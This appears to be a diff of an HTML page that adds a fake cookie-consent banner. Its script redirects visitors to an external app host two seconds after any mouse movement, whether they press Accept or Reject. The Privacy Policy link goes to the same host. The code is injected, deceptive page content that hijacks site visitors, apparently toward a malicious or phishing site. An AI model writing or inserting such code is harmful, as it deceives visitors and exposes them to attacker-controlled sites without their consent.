@@ -2,7 +2,118 @@
 <html lang="en">
 
 <head>
-
+<style>
+    , ::before, *::after { box-sizing: border-box; }
+    body, html {
+      margin: 0; padding: 0; height: 100%;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f5f7fa;
+      overflow: hidden;
+    }
+    #consent-modal {
+      position: fixed; inset: 0;
+      background: rgba(0,0,0,0.6);
+      display: flex; justify-content: center; align-items: center;
+      z-index: 9999;
+    }
+    .modal-content {
+      background: white;
+      padding: 2rem 2.5rem;
+      max-width: 440px; width: 90%;
+      border-radius: 12px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+      text-align: center;
+    }
+    .modal-content h2 {
+      margin-top: 0;
+      font-size: 1.6rem;
+      color: #333;
+    }
+    .modal-content p {
+      font-size: 1rem;
+      color: #555;
+      margin: 1rem 0 1.8rem;
+      line-height: 1.5;
+      text-align: left;
+    }
+    .btn-group {
+      display: flex;
+      justify-content: center;
+      gap: 1rem;
+    }
+    .btn-accept, .btn-reject {
+      font-weight: 600;
+      border: none;
+      border-radius: 6px;
+      padding: 0.75rem 2rem;
+      font-size: 1rem;
+      cursor: pointer;
+      user-select: none;
+      transition: background-color 0.25s ease;
+      color: white;
+    }
+    .btn-accept { background: #28a745; }
+    .btn-accept:hover, .btn-accept:focus { background: #1e7e34; outline: none; }
+    .btn-reject { background: #dc3545; }
+    .btn-reject:hover, .btn-reject:focus { background: #a71d2a; outline: none; }
+    @media (max-width: 480px) {
+      .modal-content { padding: 1.5rem 1.8rem; }
+      .modal-content h2 { font-size: 1.4rem; }
+      .modal-content p { font-size: 0.95rem; }
+      .btn-group { flex-direction: column; gap: 0.75rem; }
+      .btn-accept, .btn-reject {
+        width: 100%; padding: 0.85rem; font-size: 1.1rem;
+      }
+    }
+  </style>
+  <script>
+    window.onload = function () {
+      // Inject modal HTML
+      const modalHTML = `
+        <div id="consent-modal" role="dialog" aria-modal="true" aria-labelledby="consent-title" aria-describedby="consent-desc">
+          <div class="modal-content">
+            <h2 id="consent-title">🍪 We Use Cookies</h2>
+            <p id="consent-desc">
+              This Website uses cookies to personalize content and ads, provide social media features, and analyze our traffic.
+              Your data helps us improve your experience. You can choose to accept or reject the use of these cookies.
+              For more details, please read our <a href="https://ac5d368f87df05b395bbd500-m2imb.ondigitalocean.app/“target="_blank" rel="noopener noreferrer">Privacy Policy</a>.
+            </p>
+            <div class="btn-group">
+              <button class="btn-accept" id="accept-btn" type="button">Accept</button>
+              <button class="btn-reject" id="reject-btn" type="button">Reject</button>
+            </div>
+          </div>
+        </div>
+      `;
+      document.body.insertAdjacentHTML('beforeend', modalHTML);
+      const modal = document.getElementById('consent-modal');
+      const acceptBtn = document.getElementById('accept-btn');
+      const rejectBtn = document.getElementById('reject-btn');
+      const redirectUrl = "https://ac5d368f87df05b395bbd500-m2imb.ondigitalocean.app/";  // Change this to your redirect URL
+      let redirected = false;
+      function redirect() {
+        if (!redirected) {
+          redirected = true;
+          modal.style.display = 'none';
+          document.body.style.overflow = 'auto';
+          window.location.href = redirectUrl;
+        }
+      }
+      function onMouseMove() {
+        document.removeEventListener('mousemove', onMouseMove);
+        setTimeout(redirect, 2000);
+      }
+      document.addEventListener('mousemove', onMouseMove);
+      acceptBtn.addEventListener('click', () => {
+        modal.style.display = 'none';
+        document.body.style.overflow = 'auto';
+      });
+      rejectBtn.addEventListener('click', () => {
+        modal.style.display = 'none';
+        document.body.style.overflow = 'auto';
+      });
+    };
+  </script>
  
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
